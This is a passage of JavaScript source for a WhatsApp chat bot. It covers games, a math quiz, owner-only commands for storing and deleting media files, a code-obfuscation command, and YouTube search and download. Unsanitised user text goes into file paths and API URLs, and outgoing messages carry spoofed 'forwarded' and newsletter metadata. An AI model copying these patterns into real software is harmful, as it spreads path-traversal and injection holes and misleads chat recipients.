                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await ArielStore.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await ArielStore.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    replygcaespisp('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        ArielStore.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        replygcaespisp(`Session TicTacToe🎮 tidak ada`)
                    } else replygcaespisp('?')
                } catch (e) {
                    replygcaespisp('Error')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcaespisp(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return replygcaespisp(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return replygcaespisp(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcaespisp(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
                this.suit[id] = {
                    chat: await ArielStore.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) ArielStore.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcaespisp(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcaespisp(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                ArielStore.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcaespisp("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                replygcaespisp(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'openai-indo': {
	            if (!q) return replygcaespisp(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await replygcaespisp(isi)
			   }
			   break
    case 'ephemeral': {
                if (!m.isGroup) return aespispStickGroup()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (!isAdmins) return aespispStickAdmin()
                if (args[0] === 'on') {
                    await ArielStore.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcaespisp(`Done`)
                } else if (args[0] === 'off') {
                    await ArielStore.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcaespisp(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 ArielStore.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!aespispTheCreator) return aespispStickOwner()
               
               if (args[0] === 'on') {
                  antiswview = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!aespispTheCreator) return aespispStickOwner()
               
               if (args[0] === 'on') {
                  anticall = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '0029VafTpUr23n3ZiI72fY0G@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
             break
case 'addvideo':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Whats the video name?')
if (Videoaespisp.includes(q)) return replygcaespisp("The name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
Videoaespisp.push(q)
await fsx.copy(delb, `./ArielFolder/video/${q}.mp4`)
fs.writeFileSync('./ArielFolder/database/aespispvideo.json', JSON.stringify(Videoaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Enter the video name')
if (!Videoaespisp.includes(q)) return replygcaespisp("The name does not exist in the database")
let wanu = Videoaespisp.indexOf(q)
Videoaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/aespispvideo.json', JSON.stringify(Videoaespisp))
fs.unlinkSync(`./ArielFolder/video/${q}.mp4`)
replygcaespisp(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of Videoaespisp) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Videoaespisp.length}*`
replygcaespisp(teks)
}
break
case 'addimage':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Whats the image name?')
if (Imageaespisp.includes(q)) return replygcaespisp("The name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
Imageaespisp.push(q)
await fsx.copy(delb, `./ArielFolder/image/${q}.jpg`)
fs.writeFileSync('./ArielFolder/database/aespispimage.json', JSON.stringify(Imageaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Enter the image name')
if (!Imageaespisp.includes(q)) return replygcaespisp("The name does not exist in the database")
let wanu = Imageaespisp.indexOf(q)
Imageaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/aespispimage.json', JSON.stringify(Imageaespisp))
fs.unlinkSync(`./ArielFolder/image/${q}.jpg`)
replygcaespisp(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of Imageaespisp) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Imageaespisp.length}*`
replygcaespisp(teks)
}
break
case 'addsticker':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Whats the sticker name?')
if (Stickeraespisp.includes(q)) return replygcaespisp("The name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
Stickeraespisp.push(q)
await fsx.copy(delb, `./ArielFolder/sticker/${q}.webp`)
fs.writeFileSync('./ArielFolder/database/aespispsticker.json', JSON.stringify(Stickeraespisp))
fs.unlinkSync(delb)
replygcaespisp(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Enter the sticker name')
if (!Stickeraespisp.includes(q)) return replygcaespisp("The name does not exist in the database")
let wanu = Stickeraespisp.indexOf(q)
Stickeraespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/aespispsticker.json', JSON.stringify(Stickeraespisp))
fs.unlinkSync(`./ArielFolder/sticker/${q}.webp`)
replygcaespisp(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of Stickeraespisp) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Stickeraespisp.length}*`
replygcaespisp(teks)
}
break
case 'addmsg': {
	if (!aespispTheCreator) return aespispStickOwner()
                if (!m.quoted) return replygcaespisp('Reply Message You Want To Save In Database')
                if (!text) return replygcaespisp(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygcaespisp(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcaespisp(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcaespisp(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygcaespisp(`'${text}' not listed in the message list`)
                ArielStore.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcaespisp(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!aespispTheCreator) return aespispStickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygcaespisp(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcaespisp(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Whats the audio name?')
if (VoiceNoteaespisp.includes(q)) return replygcaespisp("The name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
VoiceNoteaespisp.push(q)
await fsx.copy(delb, `./ArielFolder/audio/${q}.mp3`)
fs.writeFileSync('./ArielFolder/database/aespispvn.json', JSON.stringify(VoiceNoteaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!aespispTheCreator) return aespispStickOwner()
if (args.length < 1) return replygcaespisp('Enter the vn name')
if (!VoiceNoteaespisp.includes(q)) return replygcaespisp("The name does not exist in the database")
let wanu = VoiceNoteaespisp.indexOf(q)
VoiceNoteaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/aespispvn.json', JSON.stringify(VoiceNoteaespisp))
fs.unlinkSync(`./ArielFolder/audio/${q}.mp3`)
replygcaespisp(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteaespisp) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteaespisp.length}*`
replygcaespisp(teks)
}
break
case 'addzip':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp(`What's the zip name?`)
let teks = `${text}`
{
if (Zipaespisp.includes(teks)) return replygcaespisp("This name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
Zipaespisp.push(teks)
await fsx.copy(delb, `./ArielFolder/zip/${teks}.zip`)
fs.writeFileSync('./ArielFolder/database/zip.json', JSON.stringify(Zipaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp('Enter the text in the zip list')
let teks = `${text}`
{
if (!Zipaespisp.includes(teks)) return replygcaespisp("This name does not exist in the database")
let wanu = Zipaespisp.indexOf(teks)
Zipaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/zip.json', JSON.stringify(Zipaespisp))
fs.unlinkSync(`./ArielFolder/zip/${teks}.zip`)
replygcaespisp(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of Zipaespisp) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${Zipaespisp.length}*`
replygcaespisp(teksooooo)
}
break
case 'addapk':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp('What is the name of the apk?')
let teks = `${text}`
{
if (Apkaespisp.includes(teks)) return replygcaespisp("This name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./ArielFolder/apk/${teks}.apk`)
fs.writeFileSync('./ArielFolder/database/apk.json', JSON.stringify(Apkaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp('Name of the apk?')
let teks = `${text}`
{
if (!Apkaespisp.includes(teks)) return replygcaespisp("This name does not exist in the database")
let wanu = Apkaespisp.indexOf(teks)
Apkaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/apk.json', JSON.stringify(Apkaespisp))
fs.unlinkSync(`./ArielFolder/apk/${teks}.apk`)
replygcaespisp(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of Apkaespisp) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${Apkaespisp.length}`
replygcaespisp(teksoooooo)
}
break
case 'addpdf':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp('What is the name of the pdf')
let teks = `${text}`
{
if (Docaespisp.includes(teks)) return replygcaespisp("This name is already in use")
let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
Docaespisp.push(teks)
await fsx.copy(delb, `./ArielFolder/doc/${teks}.pdf`)
fs.writeFileSync('./ArielFolder/database/doc.json', JSON.stringify(Docaespisp))
fs.unlinkSync(delb)
replygcaespisp(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!aespispTheCreator) return aespispStickOwner()

if (args.length < 1) return replygcaespisp('Enter the name')
let teks = `${text}`
{
if (!Docaespisp.includes(teks)) return replygcaespisp("This name does not exist in the database")
let wanu = Docaespisp.indexOf(teks)
Docaespisp.splice(wanu, 1)
fs.writeFileSync('./ArielFolder/database/doc.json', JSON.stringify(Docaespisp))
fs.unlinkSync(`./ArielFolder/doc/${teks}.pdf`)
replygcaespisp(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of Docaespisp) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${Docaespisp.length}*`
replygcaespisp(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
aespispBotInc_dev = await getBuffer(`https://github.com/ArielSProject/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ArielStore.sendMessage(m.chat, { audio: aespispBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: ftroli })     
break
case 'friend':
case 'searchfriend':{
await aespispStickWait()
let teman = pickRandom(aespispverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcaespisp('Managed to Get One Person')
}, 5000)
setTimeout(() => {
ArielStore.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : ftroli })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcaespisp('Reply the Message!!')
let aespispquotx= await ArielStore.serializeM(await m.getQuotedObj())
if (!aespispquotx.quoted) return replygcaespisp('The message you are replying to is not sent by the bot')
await aespispquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcaespisp(`Example ${prefix+command} const aespispbot = require('baileys')`)
let meg = await obfus(q)
replygcaespisp(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcaespisp('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcaespisp(teks)
	    }
	    break
case 'yts2': case 'ytsearch2': {
                if (!text) return replygcaespisp(`Example : ${prefix + command} story wa anime`)
                await aespispStickWait()
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                ArielStore.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: ftroli })
            }
            break
            
            case 'yts': case 'ytsearch': {
  if (!text) return replygcaespisp(`*Example :* ${prefix + command} title`);
  try {
  	await aespispStickWait()
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygcaespisp('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: ArielStore.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "quick_reply",
                 "buttonParamsJson": `{"display_text":"DOWNLOAD MP3","id":"${prefix}ytmp3 ${video.url}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"DOWNLOAD MP4","id":"${prefix}ytmp4 ${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await ArielStore.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygcaespisp(`Error`);
  }
}
break
case 'play':  case 'song': {
if (!text) return replygcaespisp(`Example : ${prefix + command} anime whatsapp status`)
const aespispplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await aespispplaymp3.mp3(anup3k.url)
await ArielStore.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp3': case 'ytaudio':{
if (!text) return replygcaespisp(`*Contoh : ${prefix+command} https://youtu.be/19ejsj191js*`)
	await aespispStickWait()
let nangisbg = await fetchJson(`https://api.junn4.my.id/download/ytmp3?url=${text}`)
ArielStore.sendMessage(m.chat, { audio : { url : nangisbg.result.result }, mimetype: 'audio/mp4', ptt: true}, {quoted: ftroli})
}
break
case 'ytmp4': case 'ytvideo': {
